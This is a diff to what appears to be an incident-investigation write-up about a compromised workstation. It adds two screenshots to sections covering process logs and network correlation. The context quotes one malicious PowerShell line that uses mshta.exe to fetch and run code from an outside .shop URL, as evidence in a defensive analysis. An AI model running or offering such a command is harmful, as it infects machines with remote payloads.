@@ -28,11 +28,17 @@ Investigated workstation `172.16.17.216`. Process and terminal logs revealed Pow
 
     powershell.exe -Command "mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4"
 
+<img width="1392" height="710" alt="338-03" src="https://github.com/user-attachments/assets/44297761-1ad2-4e93-98af-a899aa00908c" />
+
+
 
 
 ### 3. Network Analysis
 
 Correlated `mshta.exe` (PID 7284) with an allowed HTTPS connection to `172.67.139.19:443`. Firewall logs confirmed the requested URL matched the suspicious PowerShell command.
+
+<img width="1559" height="623" alt="338-network" src="https://github.com/user-attachments/assets/d78d5aff-77d0-4928-aaca-49dc7676f459" />
+
 
 ## Indicators of Compromise
 
